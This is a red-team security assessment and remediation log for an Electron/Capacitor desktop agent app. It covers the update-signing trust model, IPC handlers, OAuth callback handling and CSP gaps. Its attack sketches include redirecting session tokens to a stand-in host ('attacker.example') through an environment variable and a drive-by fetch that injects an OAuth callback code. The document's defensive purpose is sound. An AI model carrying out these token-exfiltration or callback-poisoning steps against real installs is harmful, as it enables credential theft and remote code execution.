# Red Team Assessment — maiavm-desktop (Nub Agent)

Target: Electron + Capacitor agent/chat desktop app. Trust boundary = renderer sandbox ↔ privileged main process IPC. 882 tests green, TSC clean, build clean.

Scope: Electron main/preload, IPC handlers, custom protocol, update pipeline, auth/session, VM proxies, local CLI bridges, renderer sanitization, build/release.

## Critical

### C1 — Self-update has no independent trust anchor (CDN compromise → mass RCE)

maia:updateApply downloads a zip from https://download.maiavm.com/, verifies it against a SHA-256 — but the SHA-256 comes from the same manifest on the same origin (maia:updateCheck reads latest.json from download.maiavm.com, and the sha256 field in that manifest is the trust anchor). There is no code-signing verification on the downloaded .app bundle itself. The build deliberately refuses Developer ID signing (verifySign in build-desktop.mjs rejects Authority=Developer ID Application).

Attack: Compromise the Cloudflare R2 bucket maiavm-desktop-downloads (or steal the CLOUDFLARE_API_TOKEN, which upload-desktop.mjs reads from .env.local) → publish a latest.json with a malicious zip URL + matching SHA-256 → every desktop client that runs updateCheck + updateApply silently swaps in an attacker .app and relaunches it. The user sees only a progress bar. The helper script runs xattr -cr on the new bundle, clearing quarantine.

The SHA-256 is integrity, not authenticity. Without a detached signature or a pinned public key the updater can't verify, it's TOFU on the CDN.

Fix options: (a) Sign the zip with a detached Ed25519 signature, verify with a public key compiled into the app (not fetched). (b) Pin the expected SHA-256 at build time into the app and fetch only the version + URL from the manifest (but this blocks genuine updates). (c) Use Apple notarization (requires paid Developer Program) and verify the notarization ticket at update time. (d) At minimum, separate the manifest host from the artifact host and pin a public key for the manifest.

### C2 — MAIAVM_API_BASE env override → session token exfiltration

nub-link.cjs:apiBase() reads `process.env.MAIAVM_API_BASE || process.env.VITE_MAIAVM_API_BASE || 'https://www.maiavm.com'` with no allowlist on the host. refreshFromMe() sends `Authorization: Bearer ${session.desktopToken}` to this base. pollAuth trusts the response's instance.publicUrl and gatewayToken and stores them as the VM endpoint for all subsequent traffic.

Attack: Set `MAIAVM_API_BASE=https://attacker.example` via ~/.zshenv, launchctl setenv, a .env file, or a malicious app — all auth/refresh traffic goes to the attacker. The desktop token (long-lived session credential) is sent as a bearer header. The attacker can also return a fake publicUrl + gatewayToken, making all future VM chat/REST/MCP traffic route through their server (MITM on the agent conversation, with the attacker-controlled "gateway token" being the attacker's own — no real token leaked, but full conversation interception).

The env var is documented as a dev convenience (VITE_MAIAVM_API_BASE in .env.example) but MAIAVM_API_BASE (the non-VITE-prefixed one that apiBase() also reads) is a runtime main-process env with no pinning.

Fix: Pin apiBase() to https://www.maiavm.com in production builds (if (!app.isPackaged) allow env override). Validate publicUrl from auth responses against an allowlist (maiavm.com / known VM provider domains), not just isSafeAgentUrl (which allows any https).

## High

### H1 — MCP stdio command is unsanitized renderer-supplied → VM RCE

vmMcpHandle verb 'add' with a command field forwards it verbatim to `POST /api/instances/.../mcp` (`{ manifestId: 'custom-stdio', name, command, args }`) or to the VM dashboard /api/mcp/servers. The only validation is typeof string + .trim(). args is splitArgs (whitespace split). The VM is expected to run this as a stdio MCP server process.

If the renderer is compromised (XSS, malicious plugin, or a prompt-injected agent that triggers the UI), this is arbitrary command execution on the linked VM. The command field has no allowlist, no binary path restriction, no argument sanitization — it's a raw string from the renderer to the VM's process spawner.

Fix: Allowlist known MCP runners (uvx, npx, python -m), reject absolute paths and shell metacharacters, or require explicit user confirmation in a native dialog before installing a stdio server.

### H2 — OAuth callback server accepts any localhost request (no state/origin check)

listenForMcpOAuthCallback binds 127.0.0.1:port (default 8765 from the VM response) and accepts any `GET /callback?...`, forwarding parsed.search to the VM's auth callback endpoint. There is no state parameter validation, no Referer/Origin check, and no per-session port randomization. The server listens for 5 minutes.

Attack: Any website the user visits (or any local process) can `fetch('http://127.0.0.1:8765/callback?code=attacker_code&state=...')` during the 5-minute window. The attacker completes or poisons the MCP OAuth flow, potentially hijacking the tool's auth session. Combined with the CSP allowing connect-src http://127.0.0.1:, a compromised renderer can also hit it directly.

Fix: Generate a random state per auth attempt, validate it in the callback. Bind to a random high port, not a fixed 8765. Check the Origin/Referer header against the expected browser redirect (or use a one-time token in the path). Reject non-GET and non-/callback paths (the 404 for non-/callback is good; add method + origin checks).

### H3 — nub-vm: protocol bypasses CSP (bypassCSP: true)

vm-preview.cjs:registerScheme() registers the nub-vm scheme with `bypassCSP: true, corsEnabled: true, secure: true`. The nub-vm://file handler reads arbitrary files from the VM and serves them as HTML (with an injected `<base href="nub-vm://file...">`). Content served via nub-vm: is exempt from the page's CSP.

If the VM contains a crafted HTML file (or the VM is compromised), opening it via the preview iframe allows script execution with no CSP restrictions — no script-src enforcement, no connect-src limits. Since the scheme is corsEnabled, the main app page can also fetch() from nub-vm: origins, and a nub-vm: page can fetch back. The frame-src in the CSP explicitly allows nub-vm:.

The nub-vm://p5173 (live Vite dev server on the VM) proxies arbitrary loopback traffic, also with bypassCSP.

Fix: Drop `bypassCSP: true` and instead serve nub-vm: content with an explicit restrictive CSP header in the Response. Or sanitize/inject a CSP meta into served HTML. At minimum, don't serve text/html from nub-vm://file with script capability — strip `<script>` or serve as text/plain for unknown content types.

### H4 — maia:openHttps opens any HTTPS URL in the default browser

maia:openExternal is allowlisted (maiavm.com / telegram only), but maia:openHttps accepts any https:// URL (only rejects userinfo in the URL). The preload openHttps only checks startsWith('https://'). A compromised renderer can open arbitrary HTTPS URLs in the user's default browser — phishing pages, exploit kits, OAuth phishing.

The handler comment says "User-initiated open of a published site" but the IPC layer can't distinguish user-initiated from renderer-scripted clicks.

Fix: Remove maia:openHttps or restrict it to the same allowlist as maia:openExternal. If arbitrary-URL opening is needed, require a native confirmation dialog (show the URL, let the user confirm).

## Medium

### M1 — fs-guard TOCTOU between validation and access

validateFsPath calls realpathSync at check time, but the actual fs.readFile/fs.writeFile happens later. A symlink can be swapped between the two calls (classic TOCTOU). write-text also does `fs.mkdir(path.dirname(file), { recursive: true })` before writing — this creates directories under the validated path, but if a symlink is placed in the path after validation and before mkdir, the directory creation could follow it.

This requires an attacker with write access to the home directory already (or a race during a directory traversal), which limits practicality, but the pattern is unsound. The realpathSync fallback for non-existent paths resolves the parent dir, which is good, but doesn't prevent a race on the parent.

Fix: Use fs.realpath (async) on the final path right before the operation, or open with O_NOFOLLOW on the final component. For write-text, use fs.realpath on the parent after mkdir and re-validate containment before writing.

### M2 — xlsx 0.18.5 prototype pollution + ReDoS (documented, reachable)

Documented in docs/SECURITY.md. Reachable via FilePreview → sheet.ts → XLSX.read. Mitigations (12MB cap, cellFormula: false, 4000 row cap, String(cell) coercion) reduce but don't eliminate prototype pollution during parse. The parse itself is the risk surface, before the app-level mitigations apply.

Fix: Evaluate exceljs or drop xlsx for CSV-only (as SECURITY.md suggests). Or parse in a Web Worker with no access to window/globalThis mutation vectors (limited effectiveness).

### M3 — PDF.js parses untrusted PDFs in the main renderer

FilePreview → PdfPane → pdfjs-dist@^6.2.108. loadPdf → pdfjsLib.getDocument runs in the renderer process (in a worker, but same-origin, same sandbox). PDF.js has had RCE-class CVEs. A crafted PDF from the local fs or VM exploits a PDF.js vulnerability. No separate process or reduced-privilege worker.

Fix: Keep PDF.js updated. Consider loading PDF.js in a sandboxed `<webview>` with nodeIntegration: false and a strict CSP, or in an `<iframe>` with sandbox attributes, isolating it from the main app's IPC bridge.

### M4 — CLI bridges allowlist verbs but not flags

runHermes and runTask validate the verb (first arg) against an allowlist and cap each arg at 500 chars, but pass all subsequent flags verbatim with shell: false. If hermes or ~/.agent-tasks/bin/task has a flag that reads/writes files, executes code, or changes config (e.g., --config, --exec, --file, --hook), the renderer can pass it. kanban create with an unexpected --dangerous-flag passes if create is allowlisted.

TASK_CLI is resolved from process.env.HOME + '/.agent-tasks/bin/task' — if HOME is empty, the path is .agent-tasks/bin/task (relative to cwd). No signature verification on the task binary (unlike secrets-op.cjs which verifies op).

Fix: Allowlist flag prefixes per verb, or at least reject args starting with -- that aren't in a known-safe set. Verify the task binary exists and is owned by the user before spawning.

### M5 — STT binary resolution has no signature verification (inconsistent with secrets-op)

stt-local.cjs:resolveBin resolves whisper-cli and ffmpeg from PATH + Homebrew fallback dirs, checking only `fs.accessSync(candidate, X_OK)`. It does NOT verify a codesign signature — unlike secrets-op.cjs:verifyOpBinary which requires AgileBits team ID. If an attacker can place a binary in /opt/homebrew/bin/whisper-cli or /opt/homebrew/bin/ffmpeg (requires write access), they intercept all mic audio bytes before transcription.

Fix: For ffmpeg and whisper-cli, either verify codesign (if on macOS, require an Apple developer signature) or pin to a known path and warn if the hash changes. At minimum, log which binary path was resolved so a swap is detectable.

## Low

### L1 — safeStorage falls back to plaintext session file

readSession/writeSession use safeStorage.isEncryptionAvailable() — if false (Linux without keyring, locked keychain, headless), the gateway + desktop tokens are written as plaintext to userData/nub-desktop-session.bin (mode 0o600). Any local process with read access to userData can extract the tokens.

Fix: Refuse to store the session if safeStorage encryption is unavailable, or use an OS keychain API directly. At minimum, document this fallback clearly.

### L2 — Git operations on hostile repos can trigger hook execution

runGit runs git status / git diff with cwd set to a repo root derived from a user-opened file. Git operations in a malicious repo can trigger core.fsmonitor, core.hooksPath, or symlink-based attacks (CVE-2024-32002 class). The 15s timeout limits but doesn't prevent code execution via hooks.

Fix: Run git with `-c core.fsmonitor= -c core.hooksPath=/dev/null` to neutralize hook-based vectors. Or run git in a seccomp/AppArmor sandbox.

### L3 — No concurrency cap on maia:sttTranscribe

A compromised renderer can spawn unlimited concurrent whisper.cpp processes, exhausting CPU. maia:nubChatStream has MAX_DESKTOP_INFLIGHT = 2; STT has no equivalent.

Fix: Add a MAX_STT_INFLIGHT = 1 guard in the IPC handler.

### L4 — KaTeX output: 'html' with throwOnError: false in dangerouslySetInnerHTML

MathBlock renders KaTeX output via dangerouslySetInnerHTML. KaTeX's trust option defaults to false (good — it sanitizes), and throwOnError: false renders invalid TeX as red markup. But KaTeX's HTML output is trusted only because KaTeX sanitizes. A future KaTeX version regression or a crafted .tex file could inject HTML. The mermaid path (securityLevel: 'strict') has had historical bypasses.

Fix: Add a DOMPurify pass on the KaTeX/mermaid output before dangerouslySetInnerHTML as defense-in-depth, even though the libraries claim to sanitize. The SECURITY.md comment says "no DOMPurify is needed beyond those library guarantees" — that's a single-layer-of-defense assumption.

### L5 — Update helper written to predictable temp path

apply-update.sh / .ps1 is written to os.tmpdir() + 'nub-update-XXXXXX/' (mkdtemp, random suffix — good). But $TMPDIR on macOS is user-writable by other local processes. A local attacker could race the write, though the script is spawned immediately after download+verification and the zip path is positional. Low risk but the pattern of writing executable scripts to a shared temp dir is worth noting.

Fix: Write the helper to app.getPath('userData') (which is per-user and not world-readable) instead of $TMPDIR.

## Info / Good practices confirmed

These are done well and should be preserved:

- contextIsolation: true, sandbox: true, nodeIntegration: false — solid Electron baseline
- assertMainSender on every ipcHandle — prevents webview/secondary-window IPC spoofing
- fs-guard.cjs realpath symlink resolution — defeats basic ~/evil → /etc escape
- secrets-op.cjs verifies op codesign (AgileBits team ID) before exec — excellent
- shell: false on all spawn/execFile — no shell metachar injection
- Verb allowlists on CLI bridges (kanban, mcp, cron, sessions, secrets, task, fs)
- Update: mandatory 64-hex SHA-256, origin pinning, positional args in helper (no interpolation)
- CSP: no unsafe-eval, no wildcard connect-src (except localhost in Electron build), script-src 'self' blob:
- safe-image-url.ts: strips userinfo, allows only https/data/nub-vm/blob, caps data URLs at 2MB
- No rehype-raw — raw HTML in markdown renders as inert text (verified by adversarial test suite)
- Mermaid securityLevel: 'strict', katex throwOnError: false
- 882-test suite including adversarial markdown XSS, fs-guard symlink, sheet size guards
- APK upload: pinned cert SHA-256, v2/v3 signature scheme requirement, SDK-first apksigner resolution
- dumpConnectionToFile requires a ≥16-char nonce — prevents accidental token dump
- Token in safeStorage, never localStorage
- Build refuses to ship Developer ID signed builds (explicit no-Apple-account policy)

## Prioritized fix list

| # | Severity | Effort | Fix |
|---|----------|--------|-----|
| C1 | Critical | Med | Detached signature verification on update zip (Ed25519 pubkey in app) |
| C2 | Critical | Low | Pin apiBase() to maiavm.com in packaged builds; allowlist publicUrl host |
| H1 | High | Low | Allowlist/sanitize MCP stdio command before forwarding to VM |
| H2 | High | Low | Add state validation + random port + origin check to OAuth callback server |
| H3 | High | Med | Drop bypassCSP: true on nub-vm: or inject a strict CSP on served content |
| H4 | High | Low | Restrict maia:openHttps to the same allowlist as maia:openExternal |
| M1 | Med | Med | Re-validate path with realpath immediately before fs operations |
| M5 | Med | Low | Codesign-verify ffmpeg/whisper-cli (match secrets-op discipline) |
| M3 | Med | Low | Keep PDF.js updated; consider sandboxed iframe isolation |
| M2 | Med | Med | Evaluate exceljs or drop xlsx for CSV-only |

---

The codebase has a genuinely strong security baseline for an Electron app — the IPC sender validation, fs-guard symlink handling, secrets binary verification, and markdown XSS hardening are above average. The critical gaps are the update trust model (C1) and the env-based API base override (C2), both of which are systemic rather than implementation bugs.

---

## Remediation record — 2026-08-24

All Critical/High items and most Medium/Low items are fixed on `main`. Summary:

| # | Status | What landed |
|---|--------|-------------|
| C1 | ✅ Fixed | Ed25519 detached signatures. `electron/update-signature.cjs` verifies every update zip against a public key compiled into the build; `scripts/build-desktop.mjs` signs with `MAIA_UPDATE_SIGNING_KEY` (`.env.local`, **must be backed up**); `scripts/upload-desktop.mjs` uploads `.sig` files and embeds `signature` in latest.json; unsigned updates are refused outright (verified by `electron/update-signature.test.mjs`). Helper script also moved from `$TMPDIR` to `userData` (L5). |
| C2 | ✅ Fixed | `apiBase()` pinned to `https://www.maiavm.com` in packaged builds (env override = dev only). New `isAllowedInstanceUrl` gates session publicUrls at store time (`pollAuth`, `refreshFromMe`) AND use time (`chatCompletions`, `dashboardRequest`, `dashboardRaw`). |
| H1 | ✅ Fixed | `validateStdioMcpCommand`: bare allowlisted runners only (uvx/npx/bunx/pipx/python3), no paths, metachar-free args, ≤32×200 chars. Enforced in `vmMcpHandle 'add'` before anything leaves the desktop. |
| H2 | ✅ Fixed | Callback listener refactored to testable `makeMcpOAuthCallbackHandler`: GET-only, non-empty query required, cross-origin Origin/Referer rejected against the IdP host, callback port range-checked. Drive-by fetch injection now 403s (covered in tests). |
| H3 | ✅ Fixed | `bypassCSP: true` removed from the nub-vm scheme; every nub-vm response carries an explicit CSP (`object-src 'none'`, restricted framing). |
| H4 | ✅ Fixed | Non-allowlisted https URLs now require a native dialog showing the full target before `shell.openExternal`; allowlisted hosts stay friction-free. |
| M1 | ✅ Fixed | `assertRealInsideRoot` + hardened read/write helpers re-realpath immediately before I/O; writes use `O_NOFOLLOW` on POSIX; parent re-checked after `mkdir`. |
| M5 | ✅ Fixed | `electron/bin-guard.cjs`: refuses group/world-writable or non-regular binaries, logs resolved paths. Wired into whisper-cli/ffmpeg resolution (`stt-local.cjs`) and the task CLI (`main.cjs`). Codesign-team pinning remains impossible for self-built tools — logged-path detectability is the compensating control. |
| M4 | ◐ Partial | Task CLI resolved via `os.homedir()` + bin-guard trust check before spawn. Per-verb flag allowlisting NOT implemented (would break legitimate CLI flags); verbs remain allowlisted, args stay <500 chars, shell:false. Residual risk accepted. |
| M3 | ◐ Deferred | pdfjs-dist 6.2.108 is current upstream — nothing to bump. Sandboxed-iframe isolation of PdfPane left as future hardening (feature-affecting refactor). |
| M2 | ◐ Deferred | xlsx→exceljs evaluated and consciously deferred: existing parse-surface mitigations hold, swap risks FilePreview regressions while sheet previews see little usage. Revisit trigger documented in SECURITY.md §0. |
| L1 | ✅ Fixed | Plaintext safeStorage fallback kept (refusing would break keyring-less Linux), but warned loudly on every read/write. |
| L2 | ✅ Fixed | All git invocations run with `-c core.fsmonitor=false -c core.hooksPath=/dev/null`. |
| L3 | ✅ Fixed | `MAX_STT_INFLIGHT = 1` guard on maia:sttTranscribe; extra requests get an immediate busy result. |
| L4 | ◐ Deferred | KaTeX/mermaid already sanitize; DOMPurify second layer not added this pass (new dependency for defense-in-depth only). Revisit alongside the next markdown-renderer bump. |
| L5 | ✅ Fixed | Update helper written to `app.getPath('userData')` (mode 0700) instead of shared `$TMPDIR`. |

Verification (pass 2): 935/935 vitest tests green (53 new security/invariant tests), `tsc -b` clean, production build clean, signing pipeline smoke-tested end-to-end.

### Pass 2 — hardening loop (2026-08-24, same day)

Second adversarial pass over the fixes themselves:

| Area | What changed |
|------|--------------|
| **New finding — plugin-door jail escape** | `maia:plugins:readFileText` / `watchFile` / `watchDir` jailed paths to `~/.hermes` but NOT to the plugin roots — a compromised renderer could read `~/.hermes/serve.token` over IPC. All three now enforce dual-root containment (`assertInsidePluginRoots`) on the realpath immediately before I/O. |
| **C1 residual — version binding** | Both update helpers now verify the STAGED bundle's version (CFBundleShortVersionString / ProductVersion) against the manifest version before swapping; mismatch aborts with the old app untouched. Catches replayed/mismatched artifacts. |
| **H2 legit-flow fix** | IdP origin check made subdomain-aware (sibling hops like `auth.<idp>` → `<idp>` no longer false-reject); shared-TLD lookalikes (`notgoogle.com`, `accounts.google.com.evil.io`) stay rejected (tested). |
| **updateCheck URL pin** | `startsWith` replaced with parsed exact-origin equality (consistency with updateApply). |
| **Perf** | updateApply reuses the in-memory zip buffer for BOTH Ed25519 verification and sha256 — was reading the up-to-~100 MB artifact from disk twice. |
| **Bug caught by guard suite** | Windows helper used PowerShell 7 `??` syntax while the app spawns `powershell.exe` (5.1) — would crash every Windows update at parse time. Fixed to 5.1-safe syntax + regression tripwire added. |
| **Regression tripwires** | New `electron/security-invariants.test.mjs` locks structural invariants: bypassCSP absent, CSP headers attached everywhere, sign-before-hash order, helper argv shape, apiBase pin, git hardening flags, hardened fs ops, bin-guard gate, STT cap, plugin-root jail, preload shell isolation, dialog-gated openHttps. |

### Pass 3 — spawn-surface convergence (2026-08-24, same day)

- **Every external binary now goes through one trust discipline** (`electron/bin-guard.cjs`): `hermes`, `git` (previously bare PATH spawns) join `op`, `task`, `whisper-cli`, `ffmpeg` as resolve-→-verify→-log. A group/world-writable candidate is refused and the search continues; first sight of each path is logged once (no refresh spam). stt-local's resolution loop was deduplicated onto the shared helper.

Convergence: no unvetted process spawns remain in the main process. Further passes hit diminishing returns; remaining accepted risks are documented above (M4 flag allowlisting, M2 xlsx, M3 PDF.js isolation, L4 DOMPurify, model-file integrity).

### Shipped (2026-08-25)

**v0.1.10 is live on download.maiavm.com — the first signature-gated release.** All three platform zips carry Ed25519 signatures under stable + archive keys; `latest.json` embeds per-platform signatures; the live artifact was downloaded from production and verified against the compiled-in public key. Also landed in 0.1.10: L4 (DOMPurify defense-in-depth on mermaid/katex output) and M2 (xlsx→exceljs migration; both SheetJS HIGHs are gone from `npm audit`). M4 flag allowlisting remains skipped by decision.

Operator follow-ups:

1. **Back up `MAIA_UPDATE_SIGNING_KEY` from `.env.local`** — losing it means shipped clients refuse future in-app updates.
2. The next release MUST be built with the new `build-desktop.mjs` so it ships signed; clients running the fixed build will refuse unsigned manifests.
3. If any legit VM instance hosts live outside `*.maiavm.com`, extend `isAllowedInstanceUrl` in `nub-link.cjs` deliberately — do not loosen casually.

